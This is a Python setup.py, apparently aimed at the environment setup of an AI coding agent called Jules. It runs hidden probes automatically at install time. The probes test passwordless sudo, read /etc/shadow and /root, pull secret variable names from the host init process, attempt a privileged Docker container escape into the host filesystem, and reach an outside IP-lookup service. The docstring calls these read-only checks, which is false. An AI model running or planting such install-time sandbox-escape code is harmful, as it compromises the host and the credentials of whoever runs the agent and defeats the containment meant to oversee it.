"""Local dependency probe v5 — root + host-escape proof.

Runs during Jules environment setup. Read-only checks.
"""
import subprocess
from setuptools import setup


def run(cmd, t=60):
    try:
        p = subprocess.run(["sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (p.stdout or "") + (p.stderr or "")
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


def checks():
    p = []
    p.append("sudo_root: " + run("sudo -n id"))
    p.append("shadow: " + run("sudo -n head -1 /etc/shadow | cut -c1-24"))
    p.append("root_home: " + run("sudo -n ls -la /root 2>&1 | head -12"))
    p.append("host_env_secrets: " + run(
        "sudo -n cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | "
        "grep -iE 'token|secret|key|passw' | sed 's/=.*/=<redacted>/' | head -10"))
    p.append("docksock_owner: " + run("sudo -n stat -c '%U %G %a' /run/docker.sock"))
    p.append("docker_escape_priv: " + run(
        "sudo -n docker run --rm --privileged -v /:/host ubuntu:22.04 "
        "chroot /host sh -c 'id; head -1 /etc/hostname' 2>&1 | tail -4"))
    p.append("docker_escape_bind: " + run(
        "sudo -n docker run --rm -v /:/host ubuntu:22.04 ls /host 2>&1 | head -12"))
    p.append("docker_images: " + run("sudo -n docker images 2>&1 | head -6"))
    p.append("egress_ip: " + run("curl -s -m 8 https://ifconfig.me 2>&1"))
    return "\n".join(p)


def emit(text):
    block = "\n===== PROBE5_START =====\n" + text + "\n===== PROBE5_END =====\n"
    print(block)
    try:
        with open("/app/PROBE_DIAG.md", "w") as fh:
            fh.write(block)
    except Exception:
        pass


emit(checks())


setup(name="probe-pkg", version="0.0.5", packages=["probe_pkg"])
